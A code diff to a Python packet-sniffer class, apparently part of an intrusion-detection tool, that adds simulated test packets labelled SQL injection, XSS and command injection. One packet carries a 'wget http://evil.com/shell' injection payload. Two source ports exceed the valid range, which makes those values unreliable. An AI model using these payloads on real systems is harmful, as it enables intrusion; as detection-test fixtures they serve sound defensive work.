@@ -40,35 +40,76 @@ class PacketSniffer(threading.Thread):
     def simulate_packets(self):
         """模拟数据包用于测试"""
         self.logger.info("使用模拟数据包模式")
+        packet_types = [
+            # 正常流量
+            {
+                'src_ip': '192.168.1.100',
+                'dst_ip': '8.8.8.8',
+                'src_port': 12345,
+                'dst_port': 80,
+                'protocol': 'TCP',
+                'payload': 'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n',
+                'timestamp': datetime.now().isoformat(),
+                'length': 150
+            },
+            # 可疑端口访问
+            {
+                'src_ip': '192.168.1.101',
+                'dst_ip': '192.168.1.1',
+                'src_port': 54321,
+                'dst_port': 22,
+                'protocol': 'TCP',
+                'payload': 'ssh connection attempt',
+                'timestamp': datetime.now().isoformat(),
+                'length': 100
+            },
+            # SQL注入尝试
+            {
+                'src_ip': '192.168.1.102',
+                'dst_ip': '192.168.1.10',
+                'src_port': 65432,
+                'dst_port': 80,
+                'protocol': 'TCP',
+                'payload': "GET /login.php?id=1' OR '1'='1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+                'timestamp': datetime.now().isoformat(),
+                'length': 200
+            },
+            # XSS攻击尝试
+            {
+                'src_ip': '192.168.1.103',
+                'dst_ip': '192.168.1.10',
+                'src_port': 76543,
+                'dst_port': 80,
+                'protocol': 'TCP',
+                'payload': "POST /comment.php HTTP/1.1\r\nHost: target.com\r\nContent-Length: 50\r\n\r\ncomment=<script>alert('XSS')</script>",
+                'timestamp': datetime.now().isoformat(),
+                'length': 250
+            },
+            # 命令注入尝试
+            {
+                'src_ip': '192.168.1.104',
+                'dst_ip': '192.168.1.10',
+                'src_port': 87654,
+                'dst_port': 80,
+                'protocol': 'TCP',
+                'payload': "POST /upload.php HTTP/1.1\r\nHost: target.com\r\nContent-Length: 30\r\n\r\nfile=$(wget http://evil.com/shell)",
+                'timestamp': datetime.now().isoformat(),
+                'length': 180
+            }
+        ]
+        
+        packet_index = 0
         while self.running:
             try:
-                # 模拟正常流量
-                self.process_simulated_packet({
-                    'src_ip': '192.168.1.100',
-                    'dst_ip': '8.8.8.8',
-                    'src_port': 12345,
-                    'dst_port': 80,
-                    'protocol': 'TCP',
-                    'payload': 'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n',
-                    'timestamp': datetime.now().isoformat(),
-                    'length': 150
-                })
+                packet_data = packet_types[packet_index % len(packet_types)]
+                packet_data['timestamp'] = datetime.now().isoformat()
                 
-                time.sleep(2)
+                self.process_simulated_packet(packet_data)
+                packet_index += 1
                 
-                # 模拟可疑流量
-                self.process_simulated_packet({
-                    'src_ip': '192.168.1.101',
-                    'dst_ip': '192.168.1.1',
-                    'src_port': 54321,
-                    'dst_port': 22,
-                    'protocol': 'TCP',
-                    'payload': 'ssh connection attempt',
-                    'timestamp': datetime.now().isoformat(),
-                    'length': 100
-                })
-                
-                time.sleep(3)
+                # 随机间隔1-5秒
+                import random
+                time.sleep(random.uniform(1, 5))
                 
             except Exception as e:
                 self.logger.error(f"模拟数据包错误: {e}")
